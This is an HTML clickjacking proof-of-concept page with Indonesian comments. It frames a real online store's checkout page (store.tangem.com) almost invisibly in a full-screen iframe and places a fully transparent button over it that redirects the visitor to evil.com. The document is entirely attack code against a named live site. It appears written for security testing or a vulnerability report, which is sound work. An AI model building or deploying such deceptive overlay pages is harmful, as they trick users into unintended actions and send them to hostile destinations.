<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Clickjacking PoC</title>
  <style>
    body, html {
      margin: 0;
      padding: 0;
      height: 100%;
      overflow: hidden;
    }
    iframe {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      border: none;
      opacity: 0.1; /* halaman target terlihat samar */
      pointer-events: none; /* tidak bisa diklik langsung */
    }
    .click-button {
      position: absolute;
      top: 50%; 
      left: 50%;
      transform: translate(-50%, -50%);
      width: 300px;
      height: 60px;
      cursor: pointer;
      background: transparent;
      border: none;
      opacity: 0; /* tombol transparan total */
    }
  </style>
</head>
<body>
  <iframe src="https://store.tangem.com/checkout?cart_id=cart_01XXXXXXX"></iframe>
  
  <!-- Tombol transparan -->
  <button class="click-button" onclick="window.location.href='https://evil.com'"></button>
</body>
</html>
